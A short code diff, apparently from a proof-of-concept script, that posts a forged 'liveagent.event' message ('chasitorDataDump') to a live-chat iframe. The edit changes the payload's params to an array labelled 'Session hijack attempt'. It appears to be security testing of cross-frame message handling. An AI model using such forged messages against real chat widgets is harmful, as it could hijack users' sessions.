@@ -39,12 +39,12 @@
       setTimeout(() => {
         console.log("📤 Sending fake liveagent.event to iframe");
         postMessageToIframe({
-          method: "liveagent.event",
-          data: {
-            event: "chasitorDataDump",
-            params: { key: "POC", value: "response hijack attempt" }
-          }
-        });
+  method: "liveagent.event",
+  data: {
+    event: "chasitorDataDump",
+    params: [ { key: "POC", value: "Session hijack attempt" } ] // not object
+  }
+});
       }, 2000);
     }
 
